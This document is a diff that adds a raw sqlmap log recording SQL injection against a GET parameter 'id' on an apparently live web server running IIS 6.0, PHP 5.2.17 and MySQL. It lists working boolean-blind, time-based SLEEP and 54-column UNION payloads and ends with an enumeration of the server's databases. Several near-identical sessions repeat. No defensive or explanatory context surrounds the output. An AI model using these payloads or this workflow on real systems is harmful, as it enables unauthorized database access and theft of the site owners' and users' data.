@@ -1,0 +1,112 @@
+sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 7549=7549
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178627171,0x5359714c696745707a766e547a4d614353664346786567637250537143536d5462747a5849757256,0x71786b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mXdP
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
+sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 9360=9360
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176786a71,0x644f695454426a4e4767624f424671464f6f6b506b676d614e686a7555674b56796c476449527269,0x7170786a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FTKt
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
+sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 1599=1599
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x74716f6c7a64504d66764a4e4f43436947555a4c77787878444e48516b536b4e574b4c4663697562,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qved
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] toptop
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 1599=1599
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x74716f6c7a64504d66764a4e4f43436947555a4c77787878444e48516b536b4e574b4c4663697562,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qved
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 1599=1599
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x74716f6c7a64504d66764a4e4f43436947555a4c77787878444e48516b536b4e574b4c4663697562,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qved
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=126 AND 1599=1599
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=126 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 54 columns
+    Payload: id=126 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x74716f6c7a64504d66764a4e4f43436947555a4c77787878444e48516b536b4e574b4c4663697562,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qved
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.12
